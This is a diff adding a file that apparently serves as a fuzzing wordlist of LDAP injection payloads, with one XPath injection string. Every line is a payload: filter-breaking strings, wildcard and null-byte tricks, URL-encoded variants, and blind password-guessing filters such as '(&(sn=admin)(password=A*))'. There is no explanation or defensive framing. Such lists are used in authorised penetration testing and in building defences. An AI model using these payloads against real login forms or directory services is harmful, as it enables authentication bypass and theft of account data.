@@ -1,0 +1,63 @@
+|!
+&
+(
+)
+*
+/
+*|
+//
+@*
+%21
+%26
+%28
+%29
+%7C
+*/*
+//*
+pwd
+*)(&
+pwd)
+any))
+pwd))
+%2A%7C
+*()|&'
+*)(|(&
+*)(|(*
+*))%00
+admin*
+*()|%26'
+admin)(&)
+)(cn=))\x00
+admin))(|(|
+*(|(mail=*))
+admin)(!(&(|
+(&(user=*))%00
+*)(|(password=*
+*)(uid=*))(|(uid=*
+*(|(objectclass=*))
+admin*)((|password=*)
+admin*)((|Password=*)
+(&(user=*)(password=*))
+(&(sn=admin)(password=*))
+admin*)((|userPassword=*)
+admin*)((|userpassword=*)
+(&(sn=admin)(password=A*))
+(&(sn=admin)(password=B*))
+(&(user=*)(password=*)(&))
+(&(user=*)(|(&)(pass=pwd))
+%2A%28%7C%28mail%3D%2A%29%29
+(&(objectClass=user)(uid=*))
+(&(user=*)(&)(password=*)(&))
+(&(sn=administrator)(password=*))
+x' or name()='username' or 'x'='y
+(&(sn=administrator)(password=A*))
+(&(sn=administrator)(password=B*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*)(objectClass=*))(&objectClass=void
+(&(!(objectClass=Impresoras))(uid=s*))
+(&(uid= admin)(!(& (|) (password=any))))
+(&(uid=admin)) (| (|) (webpassword=any))
+(&(user=*)(|(password=*)(password=test))
+void)(objectClass=void))(&objectClass=void
+(&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
+(&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
